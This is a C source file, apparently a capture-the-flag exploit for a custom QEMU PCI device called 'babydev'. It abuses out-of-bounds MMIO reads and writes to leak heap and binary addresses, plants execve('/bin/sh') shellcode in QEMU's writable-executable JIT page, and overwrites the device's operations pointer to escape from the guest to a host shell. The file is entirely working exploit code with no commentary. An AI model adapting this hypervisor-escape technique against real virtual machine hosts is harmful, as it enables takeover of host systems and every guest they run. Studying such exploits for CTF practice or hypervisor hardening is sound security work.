// gcc exploit_qemu.c -o exploit_qemu

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/io.h>

struct reg_mmio {
	off_t offset;
	uint32_t data;
};

static void dump(void *buf, size_t size);

uintptr_t addr_bin_base = 0;
const uint64_t ofs_pci_babydev_mmio_ops = 0x0d1d100;
const uint64_t ofs_tcg_qemu_tb_exec     = 0x1a11940;

uintptr_t addr_libc_base = 0;

#define ADDR_LIBC(offset)	(addr_libc_base + (offset))
#define ADDR_BIN(offset)	(addr_bin_base + (offset))

static struct reg_mmio *mmio;

static uint32_t read_u32_rel(off_t off);
static void write_u32_rel(off_t off, uint32_t data);
static void read_rel(void *dst, off_t off, size_t len);
static void write_rel(off_t off, void *src, size_t len);

int main(int argc, char *argv[]){
	int mmio_fd;

	if((mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR|O_SYNC)) == -1){
		perror("open mmio");
		return -1;
	}

	if((mmio = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, mmio_fd, 0)) == MAP_FAILED){
		perror("mmap mmio");
		return -1;
	}

	uintptr_t addr_heap_state;
	read_rel(&addr_heap_state, -0x38, sizeof(uintptr_t));
	printf("[+] addr_heap_state = %p\n", (void*)addr_heap_state);
	uintptr_t addr_heap_buf = addr_heap_state + 0x40;

	uintptr_t addr_pci_babydev_mmio_ops;
	read_rel(&addr_pci_babydev_mmio_ops, -0xc8, sizeof(uintptr_t));
	addr_bin_base = addr_pci_babydev_mmio_ops - ofs_pci_babydev_mmio_ops;
	printf("[+] addr_bin_base = %p\n", (void*)addr_bin_base);

	#define read_abs(dst, addr, len)  read_rel((dst), (uintptr_t)(addr)-(uintptr_t)addr_heap_buf, (len))
	#define write_abs(addr, src, len) write_rel((uintptr_t)(addr)-(uintptr_t)addr_heap_buf, (src), (len))

	uintptr_t addr_page_rwx;
	uintptr_t addr_tcg_qemu_tb_exec = ADDR_BIN(ofs_tcg_qemu_tb_exec);
	read_abs(&addr_page_rwx, addr_tcg_qemu_tb_exec, sizeof(uintptr_t));
	printf("[+] addr_page_rwx = %p\n", (void*)addr_page_rwx);

	uint8_t shellcode[] = {0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72, 0x69, 0x1, 0x1, 0x81, 0x34, 0x24, 0x1, 0x1, 0x1, 0x1, 0x31, 0xf6, 0x56, 0x6a, 0x8, 0x5e, 0x48, 0x1, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31, 0xd2, 0x6a, 0x3b, 0x58, 0xf, 0x5};
	write_abs(addr_page_rwx + 0x4000000, shellcode, sizeof(shellcode));

	write_rel(8, (uintptr_t[]){addr_page_rwx + 0x4000000}, sizeof(uintptr_t));
	write_rel(-0xc8, (uint32_t[]){addr_heap_buf}, sizeof(uint32_t));

	mmio->offset = 0; // trigger

	return 0;
}

static uint32_t read_u32_rel(off_t off){
	mmio->offset = off;
	return mmio->data;	
}

static void write_u32_rel(off_t off, uint32_t data){
	mmio->offset = off;
	mmio->data = data;	
}

static void read_rel(void *dst, off_t off, size_t len){
	for(int i=0; i<len/sizeof(uint32_t); i++)
		((uint32_t*)dst)[i] = read_u32_rel(off+sizeof(uint32_t)*i);
}

static void write_rel(off_t off, void *src, size_t len){
	for(int i=0; i<len/sizeof(uint32_t); i++)
		write_u32_rel(off+sizeof(uint32_t)*i, ((uint32_t*)src)[i]);
}

static void dump(void *buf, size_t size){
	uint64_t *p = buf;

	printf("=== DUMP (%p-%p) ===\n", buf, buf+size);
	for(uint64_t i=0; i<size/8; i++){
		printf("%016lx ", p[i]);
		if(i%4 == 3)
			printf("\n");
	}
	printf("\n");
}
